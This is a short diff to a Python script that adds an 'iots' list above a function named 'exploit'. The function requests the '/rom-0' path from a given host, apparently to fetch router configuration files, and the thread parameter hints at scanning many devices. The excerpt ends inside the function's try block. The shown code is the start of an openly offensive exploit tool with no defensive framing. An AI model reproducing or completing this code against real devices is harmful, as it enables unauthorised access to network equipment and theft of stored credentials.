@@ -1,5 +1,7 @@
 #!/usr/bin/env python3
 
+iots = list()
+
 def exploit(host, thread):
     try:
         response = requests.get(f"http://{host}/rom-0", verify=False, timeout=1)
